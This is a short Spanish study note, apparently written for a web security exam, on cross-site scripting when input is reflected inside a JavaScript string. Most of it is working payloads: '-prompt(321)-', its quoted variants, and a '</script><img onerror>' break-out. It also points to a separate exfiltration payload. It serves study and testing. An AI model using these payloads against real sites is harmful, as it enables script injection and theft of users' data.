# XSS en contexto JS / JSON

> Cuando tu input se refleja **dentro de un string o valor JS** (no en HTML). Rompés el string y el operador `-` fuerza que se evalúe la función.

```
-prompt(321)-
```

Se convierte en algo como `valor - prompt(321) - resto`, y `prompt(321)` se ejecuta.

**Otras rupturas según el contexto**
- Dentro de comillas: `'-prompt(321)-'` o `"-prompt(321)-"`
- Cerrar el `<script>`: `</script><img src=1 onerror=prompt(321)>`

Para el examen: cambiá `prompt(321)` por `print()` o la exfil de [[exfil-oastify]].

## 🔗 [[xss-basico]] · [[../../vulnerabilities/002-xss/README|XSS]]
